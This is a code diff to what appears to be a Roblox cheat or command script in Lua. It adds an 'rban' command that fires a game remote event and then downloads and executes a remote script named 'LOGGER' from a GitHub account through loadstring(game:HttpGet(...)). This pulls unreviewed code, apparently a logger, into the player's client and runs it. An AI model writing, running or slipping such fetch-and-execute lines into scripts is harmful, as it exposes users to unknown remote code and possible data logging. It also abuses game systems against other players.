@@ -261,7 +261,15 @@ local function main_cmds(msg,plr)
                     game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
                 elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                     game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
-			    end
+                end
+            elseif cmd[1] == Prefix.."rban" then
+                if cmd[2] == "." then
+                    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
+                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
+                    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
+		        end
             end
         end
     end
